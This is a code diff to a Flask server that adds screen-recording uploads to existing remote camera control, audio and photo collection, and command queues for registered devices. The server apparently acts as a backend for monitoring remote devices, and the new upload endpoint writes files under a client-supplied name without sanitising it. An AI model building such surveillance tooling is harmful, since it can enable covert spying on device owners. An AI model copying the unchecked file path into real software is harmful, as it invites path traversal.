@@ -73,6 +73,46 @@ def upload_photo():
         print(f"❌ Photo upload error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
+# Screen recording upload endpoint
+@app.route('/upload_screen_recording', methods=['POST'])
+def upload_screen_recording():
+    try:
+        print("📹 Screen recording upload request received")
+
+        device_id = request.headers.get('X-Device-Id', 'unknown')
+        filename = request.headers.get('X-File-Name', f'screen_{int(time.time())}.mp4')
+
+        # Save screen recording file
+        file_path = os.path.join(UPLOAD_FOLDER, filename)
+        with open(file_path, 'wb') as f:
+            f.write(request.data)
+
+        file_size = os.path.getsize(file_path)
+
+        # Store file info
+        file_info = {
+            'filename': filename,
+            'device_id': device_id,
+            'upload_time': time.time(),
+            'size': file_size,
+            'type': 'screen_recording'
+        }
+
+        uploaded_files.append(file_info)
+
+        print(f"✅ Screen recording uploaded: {filename} from device {device_id}, size: {file_size} bytes")
+
+        return jsonify({
+            'status': 'success',
+            'message': 'Screen recording uploaded successfully',
+            'filename': filename,
+            'size': file_size
+        })
+
+    except Exception as e:
+        print(f"❌ Screen recording upload error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 # Camera control endpoint
 @app.route('/camera', methods=['POST'])
 def camera_control():
@@ -168,6 +208,8 @@ def serve_file(filename):
         # Determine content type based on file extension
         if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
             mimetype = 'image/jpeg'
+        elif filename.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
+            mimetype = 'video/mp4'
         else:
             mimetype = 'audio/3gpp'
 
@@ -227,13 +269,15 @@ def get_device_details(device_id):
             device_files = [f for f in uploaded_files if f['device_id'] == device_id]
             device_photos = [f for f in device_files if f.get('type') == 'photo']
             device_audios = [f for f in device_files if f.get('type') == 'audio']
+            device_screen_recordings = [f for f in device_files if f.get('type') == 'screen_recording']
             
             return jsonify({
                 'status': 'success',
                 'device': device_data,
                 'files_count': len(device_files),
                 'photos_count': len(device_photos),
-                'audios_count': len(device_audios)
+                'audios_count': len(device_audios),
+                'screen_recordings_count': len(device_screen_recordings)
             })
         return jsonify({'status': 'error', 'message': 'Device not found'}), 404
     except Exception as e:
@@ -269,7 +313,8 @@ def register_device():
             connected_devices[device_id] = {
                 'status': 'connected',
                 'last_seen': time.time(),
-                'recording': False
+                'recording': False,
+                'screen_recording': False
             }
             commands_queue[device_id] = []
             print(f"✅ Device registered: {device_id}")
@@ -378,12 +423,14 @@ def update_status():
         device_id = request.json.get('device_id')
         status = request.json.get('status')
         recording = request.json.get('recording', False)
+        screen_recording = request.json.get('screen_recording', False)
 
-        print(f"📊 Device {device_id} status update: {status}, recording: {recording}")
+        print(f"📊 Device {device_id} status update: {status}, recording: {recording}, screen_recording: {screen_recording}")
 
         if device_id in connected_devices:
             connected_devices[device_id]['status'] = status
             connected_devices[device_id]['recording'] = recording
+            connected_devices[device_id]['screen_recording'] = screen_recording
             connected_devices[device_id]['last_seen'] = time.time()
 
         return jsonify({'status': 'updated'})
@@ -425,6 +472,7 @@ if __name__ == '__main__':
     print('   - POST /camera (camera control)')
     print('   - POST /data (audio upload)')
     print('   - POST /upload_photo (photo upload)')
+    print('   - POST /upload_screen_recording (screen recording upload)')
     print('   - GET  /file/<filename>')
     print('   - GET  /get_files')
     print('   - GET  /get_device_files/<device_id>')
